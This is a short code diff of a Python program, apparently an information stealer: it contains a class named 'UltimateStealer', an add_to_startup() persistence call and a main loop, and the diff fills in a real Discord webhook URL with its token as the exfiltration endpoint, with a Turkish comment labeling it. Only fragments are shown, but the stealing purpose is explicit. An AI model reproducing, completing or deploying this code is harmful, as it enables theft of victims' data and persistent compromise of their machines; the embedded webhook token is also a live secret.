@@ -19,7 +19,7 @@ from requests.adapters import HTTPAdapter
 from requests.packages.urllib3.util.retry import Retry
 
 # Webhook URL'niz
-WEBHOOK_URL = "AES"
+WEBHOOK_URL = "https://canary.discord.com/api/webhooks/1408193231375695942/k5JnJtc007i2Ge_uhheKfjQXgPAxsrYJ2L6AJKf-1RFx6F6akZVz_NldslS4ahikrdAA"
 
 # SSL uyarılarını kapat
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
@@ -568,4 +568,5 @@ if __name__ == "__main__":
     add_to_startup()
 
     stealer = UltimateStealer()
+
     stealer.main_loop()
